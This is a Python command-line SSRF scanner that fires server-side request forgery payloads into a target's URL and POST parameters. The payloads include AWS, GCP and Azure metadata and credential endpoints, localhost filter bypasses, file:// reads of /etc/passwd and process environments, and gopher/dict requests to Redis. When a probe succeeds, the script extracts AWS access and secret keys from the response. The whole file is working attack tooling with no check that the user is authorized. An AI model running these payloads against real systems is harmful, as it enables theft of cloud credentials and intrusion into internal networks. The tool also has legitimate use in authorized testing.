#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Scanner
Tests for SSRF vulnerabilities including cloud metadata access
"""

import requests
import re
import json
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from colorama import Fore, Style, init
from datetime import datetime
import time

init(autoreset=True)


class SSRFScanner:
    """Scanner for detecting SSRF vulnerabilities"""
    
    def __init__(self, callback_url=None, output_dir='results'):
        """
        Initialize SSRF scanner
        
        Args:
            callback_url: Webhook/callback URL for blind SSRF detection
            output_dir: Directory to save results
        """
        self.callback_url = callback_url
        self.output_dir = output_dir
        self.vulnerabilities = []
        
        # SSRF payloads
        self.payloads = self._generate_payloads()
        
        # Indicators of successful SSRF
        self.success_indicators = [
            # AWS
            'ami-id', 'instance-id', 'iam/security-credentials', 'AccessKeyId', 'SecretAccessKey',
            # GCP
            'project-id', 'numeric_project_id', 'service-accounts',
            # Azure
            'subscriptionId', 'resourceGroupName', 'access_token',
            # Generic
            'root:', 'daemon:', '/etc/passwd', 'localhost', '127.0.0.1',
            # File content
            'bin/bash', 'bin/sh'
        ]
    
    def _generate_payloads(self):
        """Generate SSRF payloads"""
        payloads = {
            'aws_metadata': [
                'http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                'http://169.254.169.254/latest/user-data/',
                'http://169.254.169.254/latest/dynamic/instance-identity/',
                'http://[::ffff:169.254.169.254]/latest/meta-data/',  # IPv6 bypass
                'http://169.254.169.254.nip.io/latest/meta-data/',  # DNS bypass
            ],
            'gcp_metadata': [
                'http://metadata.google.internal/computeMetadata/v1/',
                'http://metadata.google.internal/computeMetadata/v1/instance/',
                'http://metadata.google.internal/computeMetadata/v1/project/',
                'http://metadata/computeMetadata/v1/',
            ],
            'azure_metadata': [
                'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/',
            ],
            'localhost': [
                'http://localhost',
                'http://127.0.0.1',
                'http://0.0.0.0',
                'http://[::1]',
                'http://127.1',
                'http://127.0.1',
                'http://2130706433',  # Decimal IP
                'http://0x7f000001',  # Hex IP
            ],
            'internal_network': [
                'http://192.168.0.1',
                'http://192.168.1.1',
                'http://10.0.0.1',
                'http://172.16.0.1',
            ],
            'file_protocol': [
                'file:///etc/passwd',
                'file:///etc/hosts',
                'file:///proc/self/environ',
                'file:///c:/windows/win.ini',  # Windows
            ],
            'protocol_smuggling': [
                'gopher://127.0.0.1:6379/_',  # Redis
                'dict://127.0.0.1:6379/info',  # Redis
                'sftp://127.0.0.1:22',
                'ldap://127.0.0.1:389',
            ],
        }
        
        # Add callback URL if provided
        if self.callback_url:
            payloads['blind_ssrf'] = [
                self.callback_url,
                f'{self.callback_url}/ssrf-test',
            ]
        
        return payloads
    
    def _make_request(self, url, method='GET', data=None, json_data=None, headers=None):
        """Make HTTP request"""
        try:
            req_headers = headers or {}
            
            if method.upper() == 'GET':
                response = requests.get(url, timeout=10, allow_redirects=False)
            elif method.upper() == 'POST':
                if json_data:
                    response = requests.post(url, json=json_data, headers=req_headers, timeout=10, allow_redirects=False)
                else:
                    response = requests.post(url, data=data, headers=req_headers, timeout=10, allow_redirects=False)
            else:
                return None
            
            return response
        except requests.exceptions.Timeout:
            return {'timeout': True}
        except Exception as e:
            return None
    
    def _check_response(self, response, payload_type):
        """Check if response indicates successful SSRF"""
        if not response or isinstance(response, dict):
            return False
        
        content = response.text.lower()
        
        # Check for success indicators
        for indicator in self.success_indicators:
            if indicator.lower() in content:
                return True
        
        # Check for specific patterns based on payload type
        if payload_type == 'aws_metadata':
            if 'ami-' in content or 'i-' in content or 'accesskeyid' in content:
                return True
        
        elif payload_type == 'gcp_metadata':
            if 'project-id' in content or 'numeric_project_id' in content:
                return True
        
        elif payload_type == 'azure_metadata':
            if 'subscriptionid' in content or 'resourcegroupname' in content:
                return True
        
        elif payload_type == 'file_protocol':
            if 'root:' in content or 'daemon:' in content or '[extensions]' in content:
                return True
        
        return False
    
    def _find_url_parameters(self, url):
        """Find URL parameters that might be vulnerable to SSRF"""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Common parameter names for SSRF
        ssrf_params = [
            'url', 'uri', 'path', 'dest', 'destination', 'redirect', 'link',
            'file', 'document', 'folder', 'root', 'page', 'feed', 'host',
            'port', 'to', 'out', 'view', 'dir', 'download', 'load', 'return',
            'next', 'data', 'reference', 'site', 'html', 'callback'
        ]
        
        vulnerable_params = []
        for param in params.keys():
            if param.lower() in ssrf_params:
                vulnerable_params.append(param)
        
        return vulnerable_params
    
    def test_url_parameter(self, url, param):
        """Test a specific URL parameter for SSRF"""
        print(f"\n{Fore.CYAN}[*] Testing parameter: {param}{Style.RESET_ALL}")
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Test each payload category
        for payload_type, payload_list in self.payloads.items():
            print(f"  Testing {payload_type}...")
            
            for payload in payload_list[:3]:  # Limit to 3 payloads per category
                # Replace parameter value with payload
                test_params = params.copy()
                test_params[param] = [payload]
                
                # Build test URL
                new_query = urlencode(test_params, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
                
                # Make request
                response = self._make_request(test_url)
                
                # Check for timeout (possible blind SSRF)
                if isinstance(response, dict) and response.get('timeout'):
                    print(f"{Fore.YELLOW}[!] Request timeout - possible blind SSRF{Style.RESET_ALL}")
                    print(f"    Payload: {payload}")
                    
                    vuln = {
                        'type': 'Blind SSRF (Timeout)',
                        'severity': 'Medium',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'payload_type': payload_type,
                        'description': f'Request timeout when testing SSRF payload - may indicate blind SSRF'
                    }
                    self.vulnerabilities.append(vuln)
                    continue
                
                # Check response for SSRF indicators
                if response and self._check_response(response, payload_type):
                    print(f"{Fore.RED}[!] SSRF VULNERABILITY FOUND!{Style.RESET_ALL}")
                    print(f"    Parameter: {param}")
                    print(f"    Payload: {payload}")
                    print(f"    Type: {payload_type}")
                    
                    # Extract sensitive data from response
                    sensitive_data = self._extract_sensitive_data(response.text, payload_type)
                    
                    vuln = {
                        'type': 'SSRF',
                        'severity': 'Critical' if payload_type in ['aws_metadata', 'gcp_metadata', 'azure_metadata'] else 'High',
                        'url': url,
                        'parameter': param,
                        'payload': payload,
                        'payload_type': payload_type,
                        'status_code': response.status_code,
                        'response_size': len(response.content),
                        'sensitive_data': sensitive_data,
                        'description': f'SSRF vulnerability allows access to {payload_type}'
                    }
                    self.vulnerabilities.append(vuln)
                
                # Small delay to avoid rate limiting
                time.sleep(0.5)
    
    def _extract_sensitive_data(self, content, payload_type):
        """Extract sensitive data from response"""
        sensitive = []
        
        if payload_type == 'aws_metadata':
            # Extract AWS credentials
            access_key = re.search(r'AccessKeyId["\s:]+([A-Z0-9]{20})', content, re.IGNORECASE)
            if access_key:
                sensitive.append(f'AWS Access Key: {access_key.group(1)[:10]}...')
            
            secret_key = re.search(r'SecretAccessKey["\s:]+([A-Za-z0-9/+=]{40})', content, re.IGNORECASE)
            if secret_key:
                sensitive.append(f'AWS Secret Key: {secret_key.group(1)[:10]}...')
        
        elif payload_type == 'gcp_metadata':
            # Extract GCP project info
            project_id = re.search(r'project-id["\s:]+([a-z0-9-]+)', content, re.IGNORECASE)
            if project_id:
                sensitive.append(f'GCP Project ID: {project_id.group(1)}')
        
        elif payload_type == 'file_protocol':
            # Extract file content snippets
            if 'root:' in content:
                sensitive.append('File content: /etc/passwd accessible')
        
        return sensitive
    
    def test_url(self, url, method='GET'):
        """Test a URL for SSRF vulnerabilities"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Testing URL: {url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        # Find potential SSRF parameters
        params = self._find_url_parameters(url)
        
        if not params:
            print(f"{Fore.YELLOW}[-] No obvious SSRF parameters found{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}[+] Found {len(params)} potential SSRF parameter(s): {', '.join(params)}{Style.RESET_ALL}")
        
        # Test each parameter
        for param in params:
            self.test_url_parameter(url, param)
    
    def test_post_data(self, url, data_keys):
        """Test POST data for SSRF"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Testing POST data for SSRF{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        for key in data_keys:
            print(f"\n{Fore.CYAN}[*] Testing POST parameter: {key}{Style.RESET_ALL}")
            
            for payload_type, payload_list in self.payloads.items():
                for payload in payload_list[:2]:  # Limit payloads
                    data = {key: payload}
                    
                    response = self._make_request(url, 'POST', data=data)
                    
                    if response and self._check_response(response, payload_type):
                        print(f"{Fore.RED}[!] SSRF VULNERABILITY FOUND!{Style.RESET_ALL}")
                        print(f"    POST Parameter: {key}")
                        print(f"    Payload: {payload}")
                        
                        vuln = {
                            'type': 'SSRF (POST)',
                            'severity': 'Critical' if payload_type in ['aws_metadata', 'gcp_metadata'] else 'High',
                            'url': url,
                            'parameter': key,
                            'method': 'POST',
                            'payload': payload,
                            'payload_type': payload_type,
                            'description': f'SSRF vulnerability in POST parameter allows access to {payload_type}'
                        }
                        self.vulnerabilities.append(vuln)
                    
                    time.sleep(0.5)
    
    def save_results(self, target):
        """Save scan results to JSON file"""
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f"{self.output_dir}/{target.replace('://', '_').replace('/', '_')}_ssrf_scan_{timestamp}.json"
        
        results = {
            'target': target,
            'scan_date': datetime.now().isoformat(),
            'total_vulnerabilities': len(self.vulnerabilities),
            'vulnerabilities': self.vulnerabilities
        }
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2)
        
        print(f"\n{Fore.GREEN}[+] Results saved to: {filename}{Style.RESET_ALL}")
        return filename
    
    def print_summary(self):
        """Print scan summary"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}SSRF Scan Summary{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        if self.vulnerabilities:
            print(f"{Fore.RED}[!] Found {len(self.vulnerabilities)} SSRF vulnerabilities!{Style.RESET_ALL}\n")
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{Fore.RED}Vulnerability #{i}:{Style.RESET_ALL}")
                print(f"  Type: {vuln['type']}")
                print(f"  Severity: {vuln['severity']}")
                print(f"  URL: {vuln['url']}")
                print(f"  Parameter: {vuln['parameter']}")
                print(f"  Payload Type: {vuln['payload_type']}")
                print(f"  Payload: {vuln['payload']}")
                
                if 'sensitive_data' in vuln and vuln['sensitive_data']:
                    print(f"  {Fore.RED}Sensitive Data Found:{Style.RESET_ALL}")
                    for data in vuln['sensitive_data']:
                        print(f"    - {data}")
                
                print()
        else:
            print(f"{Fore.GREEN}[+] No SSRF vulnerabilities found{Style.RESET_ALL}")


def main():
    """Main function for CLI usage"""
    parser = argparse.ArgumentParser(description='SSRF Scanner - Test for Server-Side Request Forgery')
    parser.add_argument('-u', '--url', required=True, help='Target URL to test')
    parser.add_argument('-m', '--method', default='GET', help='HTTP method (GET, POST)')
    parser.add_argument('-c', '--callback', help='Callback URL for blind SSRF detection')
    parser.add_argument('-o', '--output', default='results', help='Output directory')
    
    args = parser.parse_args()
    
    print(f"{Fore.CYAN}╔═══════════════════════════════════════════════╗{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║         SSRF Vulnerability Scanner           ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}║   Server-Side Request Forgery Testing        ║{Style.RESET_ALL}")
    print(f"{Fore.CYAN}╚═══════════════════════════════════════════════╝{Style.RESET_ALL}\n")
    
    scanner = SSRFScanner(callback_url=args.callback, output_dir=args.output)
    scanner.test_url(args.url, args.method)
    scanner.print_summary()
    
    if scanner.vulnerabilities:
        scanner.save_results(args.url)


if __name__ == '__main__':
    main()
